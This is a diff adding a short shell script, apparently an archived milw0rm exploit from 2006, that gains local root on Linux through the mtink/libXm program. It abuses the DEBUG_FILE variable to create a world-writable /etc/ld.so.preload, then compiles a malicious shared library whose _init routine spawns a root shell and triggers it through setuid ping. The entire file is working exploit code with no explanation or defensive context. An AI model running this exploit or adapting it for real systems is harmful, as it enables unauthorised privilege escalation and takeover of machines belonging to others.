@@ -1,0 +1,26 @@
+#!/bin/sh
+echo
+echo "mtink libXm local root exploit"
+echo "* karol@wiesek.pl *"
+echo
+umask 000
+export DEBUG_FILE="/etc/ld.so.preload"
+cat > /tmp/lib.c << _EOF
+#include <unistd.h>
+void _init(void)
+{
+	if (getuid()!=0 && geteuid()==0)
+	{
+		setuid(0);
+		unlink("/etc/ld.so.preload");
+		execl("/bin/bash", "bash", 0);
+	}
+}
+_EOF
+/usr/bin/gcc -o /tmp/lib.o -c /tmp/lib.c
+/usr/bin/ld -shared -o /tmp/lib.so /tmp/lib.o
+/usr/bin/mtink
+echo "/tmp/lib.so" > /etc/ld.so.preload
+/bin/ping
+
+# milw0rm.com [2006-08-08]
